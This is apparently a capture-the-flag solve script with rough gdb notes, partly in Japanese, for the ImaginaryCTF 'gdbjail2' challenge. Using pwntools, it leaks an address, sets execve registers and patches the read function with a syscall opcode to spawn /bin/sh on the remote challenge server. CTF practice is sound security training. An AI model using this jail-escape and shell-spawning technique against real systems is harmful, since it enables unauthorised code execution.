"""n
(gdb) continue
/bin/sh
/bin/sh
(gdb) set $rdi = $rsi
(gdb) set $rip = system
Banned word detected! → なるほど、その p か
syscall を乗っ取る？
   0x7f393986e81a <__GI___libc_read+74>:        syscall 
→ なんか無理そうだった
"""

"""
pwndbg> p read - buf
$1 = 1279952
buf=0x7f7d75d13000

0x7f7d75d13000 + 1279952 == 140176825563088
pwndbg> set *140176825563088 = 1295

set $rax = 59
set $rdi = $rsi
set $rsi = 0
set $rdx = 0
"""

"""
continue
/bin/sh
set $rax = 59
set $rdi = $rsi
set $rsi = 0
set $rdx = 0
"""

from pwn import *

context.log_level = "DEBUG"

io = remote("gdbjail2.chal.imaginaryctf.org", 1337)

io.recvuntil(b"buf=")
buf = int(io.recv(14), 16)
read = buf + 1279952

io.sendlineafter(b"(gdb)", b"continue")
io.sendline(b"/bin/sh\x00")
io.sendlineafter(b"(gdb)", b"set $rax = 59")
io.sendlineafter(b"(gdb)", b"set $rdi = $rsi")
io.sendlineafter(b"(gdb)", b"set $rsi = 0")
io.sendlineafter(b"(gdb)", b"set $rdx = 0")
io.sendlineafter(b"(gdb)", f"set *{read} = 1295".encode())
io.sendlineafter(b"(gdb)", b"continue")

io.interactive()
